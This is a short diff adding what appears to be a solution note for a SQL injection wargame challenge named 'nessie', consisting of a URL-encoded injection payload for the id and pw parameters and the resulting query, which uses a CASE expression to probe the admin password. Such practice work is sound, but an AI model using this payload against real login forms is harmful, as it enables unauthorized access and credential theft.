@@ -1,0 +1,3 @@
+?id=admin&pw=%27%20OR%201=(case%20when%20id=%27admin%27%20then%20pw%20else%200%20end)--
+query : select id from prob_nessie where id='admin' and pw='' OR 1=(case when id='admin' then pw else 0 end)--'
+
